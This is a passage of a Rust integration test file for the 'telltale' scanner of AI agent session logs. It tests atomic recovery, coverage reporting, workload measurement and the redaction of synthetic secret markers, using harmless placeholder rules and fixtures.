use super::*;

static WATCH_PROCESS_MUTEX: std::sync::Mutex<()> = std::sync::Mutex::new(());

// Opt-in measurements stay at the process boundary, not in the scanner.
#[cfg(target_os = "linux")]
mod workload {
    use super::*;

    pub(super) struct Measurements {
        name: &'static str,
        pub(super) samples: Vec<Value>,
        hwm_kib: Option<u64>,
        rss_kib: Option<u64>,
        exit_peak_kib: Option<u64>,
        pid: Option<u32>,
    }

    impl Measurements {
        pub(super) fn new(name: &'static str) -> Self {
            Self {
                name,
                samples: Vec::new(),
                hwm_kib: None,
                rss_kib: None,
                exit_peak_kib: None,
                pid: None,
            }
        }

        pub(super) fn enabled() -> bool {
            std::env::var_os("TELLTALE_WORKLOAD_REPORT_DIR").is_some()
        }

        pub(super) fn reset_process(&mut self, pid: u32) {
            self.pid = Some(pid);
            self.hwm_kib = None;
            self.rss_kib = None;
            self.exit_peak_kib = None;
        }

        pub(super) fn observe(&mut self, pid: u32) {
            if !Self::enabled() {
                return;
            }
            if self.pid != Some(pid) {
                self.reset_process(pid);
            }
            if let Ok(status) = fs::read_to_string(format!("/proc/{pid}/status")) {
                for (key, target) in [("VmHWM:", &mut self.hwm_kib), ("VmRSS:", &mut self.rss_kib)]
                {
                    if let Some(value) = status.lines().find_map(|line| {
                        line.strip_prefix(key)?
                            .split_whitespace()
                            .next()?
                            .parse::<u64>()
                            .ok()
                    }) {
                        *target = Some(target.unwrap_or(0).max(value));
                    }
                }
            }
        }

        pub(super) fn sample(&mut self, stage: &str, elapsed: Duration, state: &Path, log: &Path) {
            if !Self::enabled() {
                return;
            }
            self.samples.push(serde_json::json!({
                "stage": stage, "latency_ms": elapsed.as_secs_f64() * 1000.0,
                "observed_process_pid":self.pid,
                "observed_process_hwm_kib": self.hwm_kib,
                "sampled_process_rss_max_kib": self.rss_kib,
                "exit_process_peak_rss_kib": self.exit_peak_kib,
                "state_bytes": fs::metadata(state).ok().map(|m| m.len()),
                "active_log_bytes": fs::metadata(log).ok().map(|m| m.len()),
            }));
        }

        pub(super) fn source_counts(&mut self, summary: &Value) {
            if let Some(sample) = self.samples.last_mut() {
                sample["source_processing"] = summary["source_processing"].clone();
                sample["emitted_count"] = summary["emitted_count"].clone();
                sample["source_exclusion_bytes"] = Value::Null;
                sample["source_byte_visits"] = Value::Null;
            }
        }

        // Unlike observe(), this is one settled, live-process sample, not a
        // lifetime maximum. Missing procfs measurements remain null.
        pub(super) fn settled(&mut self, pid: u32, details: Value) {
            if let Some(sample) = self.samples.last_mut() {
                let status = fs::read_to_string(format!("/proc/{pid}/status")).ok();
                for (key, field) in [
                    ("VmRSS:", "settled_current_rss_kib"),
                    ("VmHWM:", "settled_cumulative_hwm_kib"),
                ] {
                    sample[field] = status
                        .as_ref()
                        .and_then(|s| {
                            s.lines().find_map(|line| {
                                line.strip_prefix(key)?
                                    .split_whitespace()
                                    .next()?
                                    .parse::<u64>()
                                    .ok()
                            })
                        })
                        .map(Value::from)
                        .unwrap_or(Value::Null);
                }
                sample["settled_fd_count"] = fs::read_dir(format!("/proc/{pid}/fd"))
                    .ok()
                    .and_then(|entries| entries.collect::<Result<Vec<_>, _>>().ok())
                    .map(|entries| Value::from(entries.len()))
                    .unwrap_or(Value::Null);
                sample["settled"] = details;
            }
        }

        pub(super) fn sample_count(&self) -> usize {
            self.samples.len()
        }

        pub(super) fn run(&mut self, command: &mut Command) -> std::process::Output {
            if !Self::enabled() {
                return command.output().unwrap();
            }
            let stdout = tempfile::NamedTempFile::new().unwrap();
            let stderr = tempfile::NamedTempFile::new().unwrap();
            command
                .stdout(stdout.reopen().unwrap())
                .stderr(stderr.reopen().unwrap());
            let child = WatchChildGuard::new(command.spawn().unwrap());
            let deadline = Instant::now() + Duration::from_secs(30);
            self.hwm_kib = None;
            self.rss_kib = None;
            self.exit_peak_kib = None;
            let status = loop {
                self.observe(child.id());
                let mut status = 0;
                // This guard exclusively owns the child; no other waiter can reap
                // it. wait4 writes initialized status/rusage only on a positive PID.
                let mut usage = std::mem::MaybeUninit::<libc::rusage>::uninit();
                let waited = unsafe {
                    libc::wait4(
                        child.id() as libc::pid_t,
                        &mut status,
                        libc::WNOHANG,
                        usage.as_mut_ptr(),
                    )
                };
                if waited > 0 {
                    let usage = unsafe { usage.assume_init() };
                    self.exit_peak_kib = u64::try_from(usage.ru_maxrss).ok();
                    use std::os::unix::process::ExitStatusExt;
                    break std::process::ExitStatus::from_raw(status);
                }
                if waited < 0 {
                    let error = std::io::Error::last_os_error();
                    assert_eq!(
                        error.kind(),
                        std::io::ErrorKind::Interrupted,
                        "wait4 failed"
                    );
                }
                assert!(Instant::now() < deadline, "measured CLI timeout");
                thread::sleep(Duration::from_millis(2));
            };
            // wait4 above already reaped this PID; a second std::process wait
            // would return ECHILD. Disarm only after that successful native wait.
            #[allow(clippy::zombie_processes)]
            let _ = child.disarm();
            std::process::Output {
                status,
                stdout: fs::read(stdout.path()).unwrap(),
                stderr: fs::read(stderr.path()).unwrap(),
            }
        }

        pub(super) fn finish(
            &self,
            fixtures: &[&[u8]],
            fixture_scope: &str,
            options: Value,
            retention: Value,
        ) {
            let Some(directory) = std::env::var_os("TELLTALE_WORKLOAD_REPORT_DIR") else {
                return;
            };
            let digest = |bytes: &[u8]| format!("{:x}", sha2::Sha256::digest(bytes));
            let output = |program: &str, args: &[&str]| {
                let result = Command::new(program).args(args).output().unwrap();
                assert!(
                    result.status.success(),
                    "measurement provenance command failed"
                );
                result.stdout
            };
            let mut fixture = Vec::new();
            for bytes in fixtures {
                fixture.extend_from_slice(&(bytes.len() as u64).to_le_bytes());
                fixture.extend_from_slice(bytes);
            }
            let mut latencies = self
                .samples
                .iter()
                .map(|v| v["latency_ms"].as_f64().unwrap())
                .collect::<Vec<_>>();
            latencies.sort_by(f64::total_cmp);
            let percentile = |p: usize| {
                latencies
                    .get((latencies.len() * p).div_ceil(100).saturating_sub(1))
                    .copied()
            };
            let cpu = fs::read_to_string("/proc/cpuinfo").ok().and_then(|s| {
                s.lines()
                    .find_map(|l| l.strip_prefix("model name\t: ").map(str::to_owned))
            });
            let memory = fs::read_to_string("/proc/meminfo").ok().and_then(|s| {
                s.lines()
                    .find_map(|l| l.strip_prefix("MemTotal:").map(|v| v.trim().to_owned()))
            });
            let report = serde_json::json!({
                "format_version": 2, "workload": self.name,
                "source_sha": String::from_utf8(output("git", &["rev-parse", "HEAD"])).unwrap().trim(),
                "tracked_patch_sha256": digest(&output("git", &["diff", "HEAD", "--binary"])),
                "untracked_files_present": !output("git", &["ls-files", "--others", "--exclude-standard"]).is_empty(),
                "cli_binary_sha256": digest(&fs::read(env!("CARGO_BIN_EXE_telltale")).unwrap()),
                "fixture_fingerprint_sha256": digest(&fixture), "fixture_fingerprint_scope": fixture_scope,
                "fixture_fingerprint_encoding": "ordered u64 little-endian length then bytes",
                "toolchain": String::from_utf8(output("rustc", &["-Vv"])).unwrap(),
                "profile": if cfg!(debug_assertions) { "debug" } else { "release" },
                "features": "root CLI default features; opencode-sqlite dependencies enabled",
                "host": { "os": std::env::consts::OS, "arch": std::env::consts::ARCH, "kernel": String::from_utf8(output("uname", &["-r"])).unwrap().trim(), "cpu": cpu, "memory": memory },
                "options": options, "samples": self.samples,
                "latency_ms": { "p50": percentile(50), "p95": percentile(95), "max": latencies.last() },
                "rss_scope": "Linux scan exit peak uses wait4 ru_maxrss (KiB); watch exit peak unavailable. Watch VmHWM and sampled VmRSS maxima are cumulative over process lifetime through each sample, not per-cycle peaks. VmHWM is observed while alive, a lower bound if exit precedes final read. VmRSS is sampled, not a peak guarantee. settled_current_rss_kib is one live VmRSS read after settling, not a cumulative maximum; settled_cumulative_hwm_kib is the live process lifetime VmHWM at that read. New watch cases observe at settled/stage boundaries, not at high frequency, and do not measure an exact exit peak. Exited rejection-stage memory is cleared rather than attributed from another process or an earlier live sample. null means unavailable.",
                "retention": retention,
            });
            fs::create_dir_all(&directory).unwrap();
            fs::write(
                Path::new(&directory).join(format!("{}.json", self.name)),
                serde_json::to_vec_pretty(&report).unwrap(),
            )
            .unwrap();
        }
    }
}

#[test]
fn production_jsonl_cli_limit_failure_retains_baseline_and_recovers() {
    use std::io::Write;
    let temp = tempdir().unwrap();
    let root = temp.path().join("stores");
    let directory = root.join("codex/sessions");
    fs::create_dir_all(&directory).unwrap();
    let source = directory.join("synthetic.jsonl");
    let log = temp.path().join("events.jsonl");
    let state = temp.path().join("state.json");
    let first = "{\"type\":\"user\",\"session_id\":\"synthetic\",\"content\":\"synthetic first api_key=SYNTHETIC-WORKLOAD-SECRET\"}\n";
    let second =
        "{\"type\":\"user\",\"session_id\":\"synthetic\",\"content\":\"synthetic recovered\"}\n";
    fs::write(&source, first).unwrap();
    #[cfg(target_os = "linux")]
    let measurements =
        std::cell::RefCell::new(workload::Measurements::new("source-atomic-restart"));
    let scan = || {
        let started = Instant::now();
        let mut command = Command::new(env!("CARGO_BIN_EXE_telltale"));
        command
            .env_clear()
            .env("HOME", temp.path())
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--emit-activity",
                "--install-inventory-disabled",
                "--client",
                "codex",
                "--root",
            ])
            .arg(&root)
            .arg("--log-path")
            .arg(&log)
            .arg("--state-path")
            .arg(&state);
        #[cfg(target_os = "linux")]
        let output = measurements.borrow_mut().run(&mut command);
        #[cfg(not(target_os = "linux"))]
        let output = command.output().unwrap();
        #[cfg(target_os = "linux")]
        {
            let mut measurements = measurements.borrow_mut();
            let stage = match measurements.sample_count() {
                0 => "cold-state",
                1..=5 => "warm-restart",
                6 => "source-saturated",
                7 => "repaired-restart",
                _ => "repeated-restart",
            };
            measurements.sample(stage, started.elapsed(), &state, &log);
        }
        #[cfg(not(target_os = "linux"))]
        let _ = started;
        for bytes in [&output.stdout, &output.stderr] {
            assert!(
                !String::from_utf8_lossy(bytes).contains("SYNTHETIC-WORKLOAD-SECRET"),
                "controlled marker leaked in CLI output"
            );
        }
        for path in [&state, &log] {
            if path.exists() {
                assert!(
                    !fs::read_to_string(path)
                        .unwrap()
                        .contains("SYNTHETIC-WORKLOAD-SECRET"),
                    "controlled marker leaked in persisted output"
                );
            }
        }
        assert!(
            output.status.success(),
            "{}",
            String::from_utf8_lossy(&output.stderr)
        );
        let summary = serde_json::from_slice::<Value>(&output.stdout).unwrap();
        #[cfg(target_os = "linux")]
        measurements.borrow_mut().source_counts(&summary);
        summary
    };
    let cold = scan();
    assert_eq!(cold["source_processing"]["parse_success_source_count"], 1);
    assert!(cold["activity_count"].as_u64().unwrap() > 0);
    assert!(cold["emitted_count"].as_u64().unwrap() > 0);
    let before: Value = serde_json::from_slice(&fs::read(&state).unwrap()).unwrap();
    for _ in 0..5 {
        let warm = scan();
        assert_eq!(
            warm["emitted_count"], 0,
            "warm restart duplicated activity promotion"
        );
        let warm_state = serde_json::from_slice::<Value>(&fs::read(&state).unwrap()).unwrap();
        for key in [
            "baseline_snapshots",
            "baseline_source_contributions",
            "sqlite_ingestion_cursors",
        ] {
            assert_eq!(before[key], warm_state[key], "warm restart advanced {key}");
        }
    }
    let offset = fs::metadata(&log).unwrap().len() as usize;
    let mut file = fs::File::create(&source).unwrap();
    file.write_all(first.as_bytes()).unwrap();
    file.write_all(second.as_bytes()).unwrap();
    file.write_all(&vec![b' '; 8 * 1024 * 1024 + 1]).unwrap();
    let failed = scan();
    assert_eq!(failed["source_processing"]["parse_error_source_count"], 1);
    assert_eq!(failed["source_processing"]["parsed_record_count"], 0);
    assert_eq!(failed["activity_count"], 0);
    let after: Value = serde_json::from_slice(&fs::read(&state).unwrap()).unwrap();
    for key in [
        "baseline_snapshots",
        "baseline_source_contributions",
        "sqlite_ingestion_cursors",
    ] {
        assert_eq!(before[key], after[key], "failed admission advanced {key}");
    }
    let persisted = fs::read_to_string(&log).unwrap();
    let late = persisted[offset..]
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).unwrap())
        .collect::<Vec<_>>();
    assert!(
        failed["source_processing"]["failures"]
            .as_array()
            .unwrap()
            .iter()
            .any(|failure| failure["acquisition_code"] == "source_read")
    );
    assert!(
        late.iter()
            .any(|event| event["event_type"] == "scanner_error")
    );
    assert!(
        !late
            .iter()
            .any(|event| event["event_type"] == "detection" || event["event_type"] == "activity")
    );
    fs::write(&source, format!("{first}{second}")).unwrap();
    let recovered = scan();
    assert_eq!(
        recovered["source_processing"]["parse_success_source_count"],
        1
    );
    assert_eq!(recovered["source_processing"]["parsed_record_count"], 2);
    assert!(recovered["activity_count"].as_u64().unwrap() > 0);
    assert!(recovered["emitted_count"].as_u64().unwrap() > 0);
    assert_eq!(
        recovered["source_processing"]["parse_error_source_count"],
        0
    );
    let recovered_state: Value = serde_json::from_slice(&fs::read(&state).unwrap()).unwrap();
    assert_ne!(
        before["baseline_source_contributions"],
        recovered_state["baseline_source_contributions"]
    );
    let repeated = scan();
    assert_eq!(repeated["source_processing"]["parse_error_source_count"], 0);
    assert_eq!(
        repeated["emitted_count"], 0,
        "repeated restart duplicated activity promotion"
    );
    let repeated_state: Value = serde_json::from_slice(&fs::read(&state).unwrap()).unwrap();
    assert_eq!(
        recovered_state["baseline_snapshots"],
        repeated_state["baseline_snapshots"]
    );
    #[cfg(target_os = "linux")]
    measurements.borrow().finish(&[first.as_bytes(), second.as_bytes(), &vec![b' '; 8 * 1024 * 1024 + 1]], "source-sequence-input-bytes; concatenation/repetition order defined by case generator",
        serde_json::json!({"command": "scan --once --allow-fixtures --no-local-config --emit-activity --install-inventory-disabled --client codex --root <isolated> --log-path <isolated> --state-path <isolated>", "rules": "compiled defaults", "sequence": "cold state, five warm restarts, oversized record, repaired restart, repeated restart", "source_limit_bytes": 8 * 1024 * 1024, "cold_os_cache": false}),
        serde_json::json!({"outbox": null, "queue": null, "source_atomic_recovery_assertions": "passed"}));
}

#[test]
fn canonical_efficacy_fixtures_cli_characterization_and_event_privacy() {
    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).unwrap();
    let validator = validator_for(&schema).unwrap();
    let manifest: Value =
        serde_yaml::from_str(include_str!("../evaluation/manifest.yaml")).unwrap();
    for case in manifest["cases"].as_array().unwrap().iter().filter(|case| {
        case["tags"]
            .as_array()
            .unwrap()
            .iter()
            .any(|tag| tag == "canonical_efficacy")
    }) {
        let temp = tempdir().unwrap();
        let root = temp.path().join("stores");
        let directory = root.join("codex/sessions");
        fs::create_dir_all(&directory).unwrap();
        let fixture =
            Path::new(env!("CARGO_MANIFEST_DIR")).join(case["input"]["fixture"].as_str().unwrap());
        let input = fs::read_to_string(fixture).unwrap();
        let source = directory.join("synthetic.jsonl");
        fs::write(&source, &input).unwrap();
        let log = temp.path().join("events.jsonl");
        let state = temp.path().join("state.json");
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--emit-activity",
                "--client",
                "codex",
                "--root",
            ])
            .arg(&root)
            .arg("--log-path")
            .arg(&log)
            .arg("--state-path")
            .arg(&state)
            .output()
            .unwrap();
        assert!(
            output.status.success(),
            "{}: {}",
            case["id"],
            String::from_utf8_lossy(&output.stderr)
        );
        let summary: Value = serde_json::from_slice(&output.stdout).unwrap();
        let expected = case["expected_detection"]["expected_score"]
            .as_u64()
            .unwrap();
        assert_eq!(
            summary["detection_count"],
            u64::from(expected > 0),
            "{}",
            case["id"]
        );
        let persisted = fs::read_to_string(&log).unwrap();
        let events = persisted
            .lines()
            .map(|line| serde_json::from_str::<Value>(line).unwrap())
            .collect::<Vec<_>>();
        assert!(!events.is_empty());
        for event in &events {
            assert!(validator.is_valid(event), "{}: {event}", case["id"]);
        }
        let detections = events
            .iter()
            .filter(|event| event["event_type"] == "detection")
            .collect::<Vec<_>>();
        assert_eq!(detections.len(), usize::from(expected > 0));
        if let Some(detection) = detections.first() {
            assert_eq!(detection["risk_score"], expected);
            let rules = case["expected_detection"]["rule_expectations"]
                .as_array()
                .unwrap()
                .iter()
                .filter(|rule| rule["expectation"] == "expected_match")
                .map(|rule| rule["rule_id"].clone())
                .collect::<Vec<_>>();
            assert_eq!(detection["rule_ids"], serde_json::json!(rules));
            assert_eq!(
                detection["timeline_anchors"].as_array().unwrap().len(),
                1,
                "mirrors must not double analytic evidence"
            );
        }
        for bytes in [
            output.stdout,
            output.stderr,
            persisted.into_bytes(),
            fs::read(&state).unwrap(),
        ] {
            assert!(
                !String::from_utf8_lossy(&bytes).contains("SYNTHETIC-EFFICACY-PRIVATE"),
                "{}",
                case["id"]
            );
        }
        assert_eq!(fs::read_to_string(source).unwrap(), input);
    }
}

#[test]
fn scan_dry_run_reports_selected_source_coverage_without_private_details() {
    let temp = tempdir().unwrap();
    let root = temp.path().join("PRIVATE-COVERAGE-PATH");
    let directory = root.join("codex/sessions");
    fs::create_dir_all(&directory).unwrap();
    let source = directory.join("PRIVATE-COVERAGE-ID.jsonl");
    let log = temp.path().join("events.jsonl");
    let state = temp.path().join("state.json");
    let rules = temp.path().join("rules.yaml");
    fs::write(&rules, "version: 1\ndescription: synthetic\ndefaults:\n  case_insensitive: false\n  enabled: true\nrules:\n  - id: synthetic.coverage\n    category: synthetic\n    detection_class: security_detection\n    signal_type: atomic\n    analytic_intent: alert\n    severity: low\n    score: 1\n    detection:\n      selection: {user_context: NEVER-MATCH}\n      condition: selection\n    tags: [synthetic]\n    explanation: synthetic\nmodifiers: []\n").unwrap();
    let scan = || {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--dry-run",
                "--allow-fixtures",
                "--no-local-config",
                "--no-default-rules",
                "--install-inventory-disabled",
                "--root",
            ])
            .arg(&root)
            .arg("--rules")
            .arg(&rules)
            .arg("--log-path")
            .arg(&log)
            .arg("--state-path")
            .arg(&state)
            .output()
            .unwrap();
        assert!(
            output.status.success(),
            "source rejection is not globally fatal: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        assert!(!log.exists());
        assert!(!state.exists());
        let summary: Value = serde_json::from_slice(&output.stdout).unwrap();
        let diagnostics = serde_json::json!({"source_processing": summary["source_processing"], "diagnostic_warnings": summary["diagnostic_warnings"]}).to_string();
        for marker in [
            "PRIVATE-COVERAGE-PATH",
            "PRIVATE-COVERAGE-ID",
            "PRIVATE-COVERAGE-CONTENT",
            "PRIVATE-COVERAGE-SESSION",
        ] {
            assert!(
                !String::from_utf8_lossy(&output.stdout).contains(marker),
                "stdout exposed privacy sentinel {marker}"
            );
            assert!(
                !String::from_utf8_lossy(&output.stderr).contains(marker),
                "stderr exposed privacy sentinel {marker}"
            );
            assert!(!diagnostics.contains(marker));
        }
        summary
    };
    fs::write(&source, "{\"type\":\"user\",\"session_id\":\"PRIVATE-COVERAGE-SESSION\",\"content\":\"PRIVATE-COVERAGE-CONTENT\"}\n").unwrap();
    let complete = scan();
    assert_eq!(
        complete["source_processing"]["evaluation_complete_source_count"],
        1
    );
    assert_eq!(
        complete["source_processing"]["selected_source_coverage"],
        "complete"
    );
    // A tool call without source time limits process-chain visibility: a
    // successful but visibility-limited evaluation.
    fs::write(
        &source,
        "{\"type\":\"session_meta\",\"payload\":{\"session_id\":\"PRIVATE-COVERAGE-SESSION\"}}\n{\"type\":\"response_item\",\"payload\":{\"type\":\"function_call\",\"name\":\"exec\",\"call_id\":\"PRIVATE-COVERAGE-ID\",\"arguments\":{\"command\":\"PRIVATE-COVERAGE-CONTENT\"}}}\n",
    )
    .unwrap();
    let limited = scan();
    assert_eq!(
        limited["source_processing"]["visibility_limited_source_count"],
        1
    );
    assert_eq!(
        limited["source_processing"]["parse_success_source_count"],
        1
    );
    assert_eq!(
        limited["source_processing"]["accounting_complete_source_count"],
        1
    );
    assert_eq!(
        limited["source_processing"]["selected_source_coverage"],
        "partial"
    );
    assert!(
        limited["diagnostic_warnings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|w| w["code"] == "source_coverage_partial")
    );
    fs::write(&source, "{\"type\":\"user\",\"session_id\":\"PRIVATE-COVERAGE-SESSION\",\"content\":\"PRIVATE-COVERAGE-CONTENT\"}\n").unwrap();
    fs::write(
        directory.join("parse.jsonl"),
        "PRIVATE-COVERAGE-CONTENT invalid json\n",
    )
    .unwrap();
    fs::write(directory.join("bound.jsonl"), format!("{}\n{}\n", serde_json::json!({"type":"user","session_id":"PRIVATE-COVERAGE-SESSION","content":"ok"}), serde_json::json!({"type":"user","session_id":"PRIVATE-COVERAGE-SESSION","content":"PRIVATE-COVERAGE-CONTENT".repeat(4000)}))).unwrap();
    let mixed = scan();
    let processing = &mixed["source_processing"];
    assert_eq!(processing["selected_source_count"], 3);
    assert_eq!(processing["parse_success_source_count"], 1);
    assert_eq!(processing["parse_error_source_count"], 2);
    assert_eq!(
        processing["parsed_record_count"], 1,
        "rejected source is atomic"
    );
    assert_eq!(processing["selected_source_coverage"], "partial");
    let failures = processing["failures"].as_array().unwrap();
    assert!(failures.iter().any(|f| f["stage"] == "Acquisition"
        && f["acquisition_code"] == "source_read"
        && f["source_count"] == 1));
    assert!(
        failures
            .iter()
            .any(|f| f["acquisition_code"] == "unbounded_value"
                && f["bound_category"] == "MessageContent"
                && f["bound_dimension"] == "StringBytes"
                && f["source_count"] == 1)
    );
    fs::remove_file(&source).unwrap();
    let rejected = scan();
    assert_eq!(
        rejected["source_processing"]["parse_success_source_count"],
        0
    );
    assert_eq!(
        rejected["source_processing"]["selected_source_coverage"],
        "partial"
    );
    assert_eq!(rejected["source_processing"]["parsed_record_count"], 0);

    #[cfg(target_os = "linux")]
    {
        fs::remove_dir_all(&directory).unwrap();
        let opencode = root.join("opencode");
        fs::create_dir_all(&opencode).unwrap();
        let database = opencode.join("opencode.db");
        let connection = Connection::open(&database).unwrap();
        connection
            .execute_batch("CREATE TABLE message (id TEXT, session_id TEXT, time_created INTEGER, time_updated INTEGER, data TEXT); CREATE TABLE part (id TEXT, message_id TEXT, session_id TEXT, time_created INTEGER, time_updated INTEGER, data TEXT);")
            .unwrap();
        drop(connection);
        let partial_accounting = scan();
        let processing = &partial_accounting["source_processing"];
        assert_eq!(processing["evaluation_complete_source_count"], 1);
        assert_eq!(processing["visibility_limited_source_count"], 0);
        assert_eq!(processing["accounting_partial_source_count"], 1);
        assert_eq!(processing["selected_source_coverage"], "partial");
        assert_eq!(processing["parse_error_source_count"], 0);
    }
}

#[test]
fn long_message_cli_suffix_parts_exclusions_roles_privacy_and_atomic_persistence() {
    let temp = tempdir().unwrap();
    let root = temp.path().join("stores");
    let directory = root.join("codex/sessions");
    fs::create_dir_all(&directory).unwrap();
    let source = directory.join("synthetic.jsonl");
    let rules = temp.path().join("rules.yaml");
    let log = temp.path().join("events.jsonl");
    let state = temp.path().join("state.json");
    fs::write(&rules, "version: 1\ndescription: synthetic\ndefaults:\n  case_insensitive: false\n  enabled: true\nrules:\n  - id: synthetic.long\n    category: synthetic\n    detection_class: security_detection\n    signal_type: atomic\n    analytic_intent: alert\n    severity: low\n    score: 3\n    detection:\n      selection: {user_context: 'needle|first\\nsecond'}\n      exclude: {user_context: EXCLUDE}\n      condition: selection\n    tags: [synthetic]\n    explanation: synthetic\nmodifiers: []\n").unwrap();
    let text = format!(
        "api_key=SYNTHETIC-CLI-LONG-SECRET {}needle",
        "ordinary ".repeat(1_000)
    );
    let punctuation = format!(
        "https://example.invalid/{}?token=SYNTHETIC-CLI-PUNCT-SECRET&needle=1",
        ":".repeat(4_000)
    );
    let records = [
        serde_json::json!({"type":"session_meta", "payload":{"session_id":"synthetic-session"}}),
        serde_json::json!({"type":"response_item", "payload":{"type":"message", "role":"user", "content":text}}),
        serde_json::json!({"type":"response_item", "payload":{"type":"message", "role":"user", "content":punctuation}}),
        serde_json::json!({"type":"response_item", "payload":{"type":"message", "role":"user", "content":[{"type":"input_text", "text":"first"}, {"type":"tool_result", "content":"needle", "tool_use_id":"synthetic-tool"}, {"type":"input_text", "text":"second"}]}}),
        serde_json::json!({"type":"response_item", "payload":{"type":"message", "role":"developer", "content":[{"type":"input_text", "text":"needle"}]}}),
        serde_json::json!({"type":"response_item", "payload":{"type":"message", "role":"system", "content":"needle"}}),
        serde_json::json!({"type":"response_item", "payload":{"type":"message", "role":"assistant", "content":"needle"}}),
        serde_json::json!({"type":"response_item", "payload":{"type":"message", "role":"user", "content":format!("needle {}EXCLUDE", "ordinary ".repeat(1_000))}}),
    ];
    let input = format!(
        "{}\n",
        records
            .iter()
            .map(Value::to_string)
            .collect::<Vec<_>>()
            .join("\n")
    );
    fs::write(&source, &input).unwrap();
    let scan = || {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--no-default-rules",
                "--emit-activity",
                "--client",
                "codex",
                "--root",
            ])
            .arg(&root)
            .arg("--rules")
            .arg(&rules)
            .arg("--log-path")
            .arg(&log)
            .arg("--state-path")
            .arg(&state)
            .output()
            .unwrap();
        assert!(
            output.status.success(),
            "{}",
            String::from_utf8_lossy(&output.stderr)
        );
        serde_json::from_slice::<Value>(&output.stdout).unwrap()
    };
    let summary = scan();
    assert_eq!(summary["detection_count"], 1);
    assert_eq!(fs::read_to_string(&source).unwrap(), input);
    let persisted = fs::read_to_string(&log).unwrap();
    assert!(!persisted.contains("SYNTHETIC-CLI-LONG-SECRET"));
    assert!(!persisted.contains("SYNTHETIC-CLI-PUNCT-SECRET"));
    let events = persisted
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).unwrap())
        .collect::<Vec<_>>();
    let detection = events
        .iter()
        .find(|event| event["event_type"] == "detection")
        .unwrap();
    assert_eq!(detection["risk_score"], 3);
    assert_eq!(detection["timeline_anchors"].as_array().unwrap().len(), 3);
    let hashes = detection["evidence"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|e| e["field"] == "user_context")
        .map(|e| e["hash"].as_str().unwrap())
        .collect::<Vec<_>>();
    assert!(hashes.contains(&evidence_hash(&text).as_str()));
    assert!(hashes.contains(&evidence_hash(&punctuation).as_str()));
    assert!(hashes.contains(&evidence_hash("first\nsecond").as_str()));
    assert_eq!(scan()["detection_count"], 1);
    let before: Value = serde_json::from_slice(&fs::read(&state).unwrap()).unwrap();
    let offset = fs::metadata(&log).unwrap().len() as usize;
    let record = serde_json::json!({"type":"user", "session_id":"synthetic-session", "content":"x".repeat(65_528)}).to_string();
    fs::write(&source, format!("{}\n", vec![record; 129].join("\n"))).unwrap();
    let failed = scan();
    // CLI summary counts scanner errors in its detection stream.
    assert_eq!(failed["detection_count"], 1);
    assert_eq!(failed["activity_count"], 0);
    let after: Value = serde_json::from_slice(&fs::read(&state).unwrap()).unwrap();
    for key in [
        "baseline_snapshots",
        "baseline_source_contributions",
        "sqlite_ingestion_cursors",
    ] {
        assert_eq!(before[key], after[key], "partial source committed {key}");
    }
    let persisted = fs::read_to_string(&log).unwrap();
    let late = &persisted[offset..];
    assert!(
        late.lines().any(
            |line| serde_json::from_str::<Value>(line).unwrap()["event_type"] == "scanner_error"
        )
    );
    assert!(!late.contains("SYNTHETIC-CLI-LONG-SECRET"));
    // Individually valid messages and a retained batch below 8 MiB still fail
    // atomically when repeated no-match scans exhaust source-wide work.
    let document = fs::read_to_string(&rules).unwrap();
    let header = document.split("rules:\n").next().unwrap();
    let repeated = (0..40).map(|index| format!("  - id: synthetic.no{index}\n    category: synthetic\n    severity: low\n    score: 1\n    targets: [user_context]\n    regex: NEVER-MATCH\n    tags: []\n    explanation: synthetic\n")).collect::<String>();
    fs::write(&rules, format!("{header}rules:\n{repeated}modifiers: []\n")).unwrap();
    let record = serde_json::json!({"type":"user", "session_id":"synthetic-session", "content":"x".repeat(60_000)}).to_string();
    fs::write(&source, format!("{}\n", vec![record; 128].join("\n"))).unwrap();
    let offset = fs::metadata(&log).unwrap().len() as usize;
    assert_eq!(scan()["activity_count"], 0);
    let after: Value = serde_json::from_slice(&fs::read(&state).unwrap()).unwrap();
    for key in [
        "baseline_snapshots",
        "baseline_source_contributions",
        "sqlite_ingestion_cursors",
    ] {
        assert_eq!(before[key], after[key]);
    }
    let persisted = fs::read_to_string(&log).unwrap();
    let late = persisted[offset..]
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).unwrap())
        .collect::<Vec<_>>();
    assert!(
        late.iter()
            .any(|event| event["event_type"] == "scanner_error")
    );
    assert!(
        !late
            .iter()
            .any(|event| event["event_type"] == "detection" || event["event_type"] == "activity")
    );
    fs::write(&rules, document).unwrap();
    let record =
        serde_json::json!({"type":"user", "session_id":"synthetic-session", "content":punctuation})
            .to_string();
    fs::write(&source, format!("{}\n", vec![record; 1_024].join("\n"))).unwrap();
    let offset = fs::metadata(&log).unwrap().len() as usize;
    let failed = scan();
    assert_eq!(failed["activity_count"], 0);
    assert_eq!(failed["source_processing"]["parse_error_source_count"], 1);
    let after: Value = serde_json::from_slice(&fs::read(&state).unwrap()).unwrap();
    for key in [
        "baseline_snapshots",
        "baseline_source_contributions",
        "sqlite_ingestion_cursors",
    ] {
        assert_eq!(before[key], after[key]);
    }
    let persisted = fs::read_to_string(&log).unwrap();
    assert!(!persisted.contains("SYNTHETIC-CLI-PUNCT-SECRET"));
    let late = persisted[offset..]
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).unwrap())
        .collect::<Vec<_>>();
    // The previous source-wide work failure has the same scanner diagnostic;
    // existing error deduplication can suppress its second persisted copy.
    assert!(
        !late
            .iter()
            .any(|event| event["event_type"] == "detection" || event["event_type"] == "activity")
    );
}

#[cfg(target_os = "linux")]
fn idle_durable_watch_case(
    first_status: u16,
    future_pending: bool,
    dry_run: bool,
    receiver_delay: Duration,
) {
    let mut measurements =
        workload::Measurements::new(match (first_status, receiver_delay.is_zero()) {
